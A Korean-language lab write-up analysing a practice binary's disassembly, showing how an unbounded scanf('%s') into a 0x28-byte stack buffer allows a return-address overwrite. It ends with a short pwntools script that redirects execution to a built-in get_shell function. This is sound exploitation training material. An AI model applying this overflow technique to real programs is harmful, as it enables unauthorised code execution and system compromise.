# Return Address Overwrite

이 문서는 사용자 입력을 기반으로 발생하는 스택 버퍼 오버플로우 취약점을 이용해
정의된 내부 함수(get_shell)를 호출하는 방식으로 쉘을 획득하는 구조를 분석한 기록입니다.

## 원본 C코드 요약

```c
int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

## 어셈블리 분석

### main

```asm
0x4006ec <main+4>     sub    rsp, 0x30 
```

- `rsp`에 `0x30(48 바이트)` 스택 공간을 확보.

```asm
0x4006f0 <main+8>     mov    eax, 0
```

- `eax`레지스터에 `0`의 값 복사
- 함수 호출전 준비 상태

```asm
0x4006f5 <main+13>    call   init
```

- `init` 함수 호출

---

#### init

```asm
0x400667 <init>       push   rbp
0x400668 <init+1>     mov    rbp, rsp 
```

- `push rbp`으로 **현재 함수가 끝난 뒤, 이전 함수로 정확하게 돌아가기 위한 기준점 저장**
- `mov rbp, rsp`으로 새로운 스택 프레임으로 전환.

```asm
0x40066b <init+4>     mov    rax, qword ptr [rip + 0x2009ee]
```

- `rip` 명령어 주소: `0x400672`
- `[rip + 0x2009ee]` 연산 수행 → `0x400672` + `0x2009ee` = `0x240a560`
- `0x240a560` 주소의 값: `0x7ffff7f998e0 (_IO_2_1_stdin_)` 
- `0x7ffff7f998e0 (_IO_2_1_stdin_)` 값을 `rax` 레지스터 에게 전달

```asm
0x400672 <init+11>    mov    ecx, 0
```

- `rcx`레지스터 에게 `0`의 값 복사
- `rcx` 은 네 번째 인자

```asm
0x400677 <init+16>    mov    edx, 2
```

- `edx`레지스터 에게 `2`의 값 복사
- `edx` 은 세 번째 인자

```asm
0x40067c <init+21>    mov    esi, 0
```

- `esi`레지스터 에게 `0`의 값 복사
- `esi` 은 두 번째 인자

```asm
0x400681 <init+26>    mov    rdi, rax 
```

- `rax`의 값: `0x7ffff7f998e0 (_IO_2_1_stdin_)`
- `rdi` 레지스터 에게 `rax`의 값 `0x7ffff7f998e0 (_IO_2_1_stdin_)`을 복사
- `rdi` 은 첫 번째 인자

```asm
0x400684 <init+29>    call   setvbuf@plt 
```

- `setvbuf` 함수 호출
> 최종: **setvbuf(0x7ffff7f998e0 (_IO_2_1_stdin_), 0(NULL), 2, 0);**

```asm
0x400689 <init+34>    mov    rax, qword ptr [rip + 0x2009c0]
```

- `rip` 명령어 주소: `0x400690`
- `[rip + 0x2009c0]` 연산 수행 → `0x400690` + `0x2009c0` = `0x240a050`
- `0x240a050` 주소의 값: `0x7ffff7f9a5c0 (_IO_2_1_stdout_)` 
- `0x7ffff7f9a5c0 (_IO_2_1_stdout_)` 값을 `rax` 레지스터 에게 전달

```asm
0x400690 <init+41>    mov    ecx, 0                            
0x400695 <init+46>    mov    edx, 2                              
0x40069a <init+51>    mov    esi, 0                              
0x40069f <init+56>    mov    rdi, rax                           
```

- 위와 동일

```asm
0x4006a2 <init+59>    call   setvbuf@plt
```

- `setvbuf` 함수 호출
> 최종: **setvbuf(0x7ffff7f9a5c0 (_IO_2_1_stdout_), 0(NULL), 2, 0);**

```asm
0x4006a7 <init+64>    nop    
0x4006a8 <init+65>    pop    rbp          
0x4006a9 <init+66>    ret                                <main+18>
```

- 함수 종료를 위한 에필로그로, `ret` 명령어는 스택에서 리턴 주소를 꺼내 실행 흐름을 복귀시킴.(main 복귀)

최종 C언어
```c
void init() {
    setvbuf(0x7ffff7f998e0 (_IO_2_1_stdin_), 0(NULL), 2, 0);
    setvbuf(0x7ffff7f9a5c0 (_IO_2_1_stdout_), 0(NULL), 2, 0);
}
```

---

### main

```asm
0x4006fa <main+18>    lea    rdi, [rip + 0xbb]
```

- `rip` 명령어 주소: `0x400701`
- `[rip + 0xbb]` 연산 수행 → `0x400701` + `0xbb` = `0x4007bc`
- `0x4007bc` 주소 안의 값: `0x4007bc`: `"Input: "`
- `[rip + 0xbb]` 주소 `0x4007bc` 을 `rdi` 레지스터 에게 로드
- `rdi`는 첫 번째 인자

```asm
0x400701 <main+25>    mov    eax, 0
```

- `printf` 호출 직전, SysV ABI 규약에 따라 가변 인자 함수 호출 준비를 위해 `eax`를 0으로 초기화함.

```asm
0x400706 <main+30>    call   printf@plt
```

- `printf` 함수 호출
> 최종 결과: **printf("Input: ")**

```asm
0x40070b <main+35>    lea    rax, [rbp - 0x30]
```

- `rbp` 레지스터 값: `0x7fffffffdd60`
- `[rbp - 0x30]` 연산 수행 → `0x7fffffffdd60` - `0x30(48)` = `0x7fffffffdd30`
- `0x7fffffffdd30` 을 `rax` 레지스터 에게 로드

```asm
0x40070f <main+39>    mov    rsi, rax
```

- `rsi` 레지스터 에게 `rax` 의 값(`0x7fffffffdd30`) 복사
- `rsi` 는 두 번째 인자

```asm
0x400712 <main+42>    lea    rdi, [rip + 0xab]
```

- `rip` 명령어 주소: `0x400719`
- `[rip + 0xab]` 연산 수행 → `0x400719` + `0xab` = `0x4007c4`
- `0x4007c4` 주소 안의 값 분석: **`0x4007c4`: `"%s"`**
- `rdi` 레지스터 에게 `0x4007c4` 주소를 로드
- `rdi` 는 첫 번째 인자

```asm
0x400719 <main+49>    mov    eax, 0 
```

- `printf` 호출 직전, SysV ABI 규약에 따라 가변 인자 함수 호출 준비를 위해 `eax`를 0으로 초기화함.

```asm
0x40071e <main+54>    call   __isoc99_scanf@plt
```

- `scanf` 함수 호출
> 최종: **scanf("%s", 0x7fffffffdd30(입력 결과가 저장되는 주소));**

```asm
0x400723       <main+59>                       mov    eax, 0                
0x400728       <main+64>                       leave  
0x400729       <main+65>                       ret
```

- main 함수의 종료 에필로그로, `leave → ret`를 통해 정상 종료함.

최종 main C언어

```c
int main() {
    char 0x7fffffffdd30[48];  // sub rsp, 0x30
    init();
    printf("Input: ");
    scanf("%s", 0x7fffffffdd30);
    return 0;
}
```

## 결론

### 구조 분석

- `scanf("%s", buf)`는 입력을 `0x7fffffffdd30` 위치에 저장함 `(buf 시작 주소)`.
-  함수 내 `sub rsp, 0x30`으로 인해 스택에 총 48바이트의 버퍼 공간이 확보됨 (`buf[0x28]` + padding).
- 하지만 `scanf("%s", ...)`는 길이 제한이 없어 **버퍼 오버플로우(BOF) 가 발생 가능**함.

### 익스플로잇 포인트

- BOF를 이용해 `saved RBP (8바이트)`와 `rip (8바이트)`를 덮을 수 있음.
- 최종적으로 `rip`를 `get_shell()` 주소(`0x4006aa`)로 덮어 **쉘 실행** 가능.
- 이를 기반으로 파이썬 스크립트를 작성하여 익스플로잇 수행함.

### 스크립트

```python
from pwn import *

p = process("./ret_overwrite")

payload = b'A' * 48 + b'B' * 8 + p64(0x4006aa)
p.sendline(payload)
p.interactive()              
```
